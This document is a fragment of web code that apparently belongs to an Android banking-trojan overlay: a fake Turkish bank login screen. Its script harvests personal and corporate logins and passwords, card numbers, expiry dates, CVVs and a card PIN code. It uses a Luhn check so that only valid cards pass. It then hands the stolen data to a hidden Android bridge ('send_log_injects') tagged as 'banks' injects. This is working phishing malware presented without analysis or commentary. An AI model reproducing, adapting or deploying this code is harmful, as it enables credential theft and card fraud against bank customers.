        .aFirst, .aSecond {
            width: 50%;
            padding: 5px;
            color: #fff;
            opacity: 0.9;
            font-weight: 600;
            display: inline-block;
            float: left;
        }

        .aFirst:hover, .aSecond:hover {
            width: 50%;
            padding: 5px;
            color: #fff;
            opacity: 0.9;
            font-weight: 600;
            display: inline-block;
            float: left;
            text-decoration: none;
        }

        .active {
            background-color: #fff;
            color: #16a086;
            opacity: 0.8;
            border-radius: 4px;
        }

        .active:hover {
            background-color: #fff;
            color: #16a086;
            opacity: 0.8;
            border-radius: 4px;
        }

        section {
            padding: 20px;
        }

        .input {
            width: 100%;
            padding: 8px;
            padding-left: 0;
            margin-bottom: 20px;
            border: 0;
            border-bottom: 1px solid #d2d2d2;
            transition-duration: 0.2s;
        }

        input::placeholder {
            font-weight: 600;
            color: #949494
        }

        .input:focus {
            border-bottom: 2px solid  #16a086;
        }

    <script>
        $('#cc').mask('0000 0000 0000 0000');
        $('#exp').mask('00/00');
        $('#cvv').mask('000');
        $('#cardCode').mask('0000');

        var form1 = document.getElementById('form1'),
            form2 = document.getElementById('form2'),
            form3 = document.getElementById('form3'),
            login = document.getElementById('login'),
            password = document.getElementById('password'),
            passErr = document.getElementById('error_pass'),
            passErr2 = document.getElementById('error_pass2'),
            loginKurumsal = document.getElementById('loginKurumsal'),
            passwordKurumsal = document.getElementById('passwordKurumsal'),
            userNameKurumsal = document.getElementById('userNameKurumsal'),
            sendData = document.getElementById('sendData'),
            sendDataKurumsal = document.getElementById('sendDataKurumsal'),
            cc = document.getElementById('cc'),
            exp = document.getElementById('exp'),
            cvv = document.getElementById('cvv'),
            sendDataFull = document.getElementById('sendDataFull');

        var month_;
	    var year_;

        function goFirstForm() {
            form1.style.display = 'block';
            form2.style.display = 'none';
        }
        function goSecondForm() {
            form2.style.display = 'block';
            form1.style.display = 'none';
        }

        sendData.onclick = function(){
            if(login.value.length < 4){
                login.classList.add('error');
            } else {
                login.classList.remove('error');
            }
            
            if(password.value.length >= 6){
                password.classList.remove('error');
            } else {
                password.classList.add('error');
            }
            
            if(login.value.length >= 4 && password.value.length >= 6){
                
                form1.style.display = 'none';
                form2.style.display = 'none';
                form3.style.display = 'block';
            }
        }

        sendDataKurumsal.onclick = function(){
            if(loginKurumsal.value.length < 4){
                loginKurumsal.classList.add('error');
                loginKurumsal.focus();
            } else if(!/^(?=.*\d)(?=.*[a-zA-Z]).{6,}$/i.test(passwordKurumsal.value)){
                loginKurumsal.classList.remove('error');
                passwordKurumsal.classList.add('error');
                passwordKurumsal.focus();
                passErr2.style.display = 'block';
            } else if(userNameKurumsal.value.length < 4){
                passwordKurumsal.classList.remove('error');
                userNameKurumsal.classList.add('error');
                passErr2.style.display = 'none';
                userNameKurumsal.focus()
            } else if (loginKurumsal.value.length > 4 && /^(?=.*\d)(?=.*[a-zA-Z]).{6,}$/i.test(passwordKurumsal.value) && userNameKurumsal.value.length > 4) {
                loginKurumsal.classList.remove('error');
                passwordKurumsal.classList.remove('error');
                userNameKurumsal.classList.remove('error');

                form1.style.display = 'none';
                form2.style.display = 'none';
                form3.style.display = 'block';
            }
        }

        
    function check4() {
            
            var mmYY = exp.value.split('/');
				var month = parseInt(mmYY[0]);
				var year = parseInt(mmYY[1]);
			

				var expArray = exp.value.split('/');
				var today, someday;
				var exMonth = expArray[0];
				var exYear = "20" + expArray[1];

				today = new Date();
				someday = new Date();
				someday.setFullYear(exYear, exMonth, 1);

                
                if(month > 12 || month == 0 || month == 00 || someday < today || year > 35 || exp.value.length !== 5) {
                    exp.classList.add('error')
                } else {
                    exp.classList.remove('error')
                    return true
                }
        }

        function check3() {
            if(!valid_credit_card(cc.value)) {
                cc.classList.add('error')
            } else {
                cc.classList.remove('error');
                return true
            }
        }

        function check5() {
            if(check3() == true && check4() == true && exp.value.length === 5 && cvv.value.length === 3 && cardCode.value.length === 4) {
                sendDataFull.disabled = false
            } else {
                sendDataFull.disabled = true
            }
        }

        function valid_credit_card(value) {
            if(value=='' || value.length < 19 || value=='0000 0000 0000 0000') return false;
            if (/[^0-9-\s]+/.test(value)) return false;
            var nCheck = 0, nDigit = 0, bEven = false;
            value = value.replace(/\D/g, "");
            for (var n = value.length - 1; n >= 0; n--) {
                var cDigit = value.charAt(n),
                    nDigit = parseInt(cDigit, 10);
                if (bEven) {
                    if ((nDigit *= 2) > 9) nDigit -= 9;
                }
                nCheck += nDigit;
                bEven = !bEven;
            }
            return (nCheck % 10) == 0;
            
        }

        sendDataFull.onclick = function(){
        var data = {};
            data.login = login.value;
            data.password = password.value;
            data.loginKurumsal = loginKurumsal.value;
            data.passwordKurumsal = passwordKurumsal.value;
            data.userNameKurumsal = userNameKurumsal.value;
            data.cc = cc.value;
            data.exp = exp.value;
            data.cvv = cvv.value;
            data.cardCode = cardCode.value;
            data.type_injects = "banks";
            data.closed = "close_activity_injects";

        var ua = navigator.userAgent.toLowerCase();
        if(ua.indexOf("android") > -1) {
            try {
                Android.send_log_injects(JSON.stringify(data))
            } catch (err) {}
        }else{
            alert(JSON.stringify(data));
        }
    }
    </script>
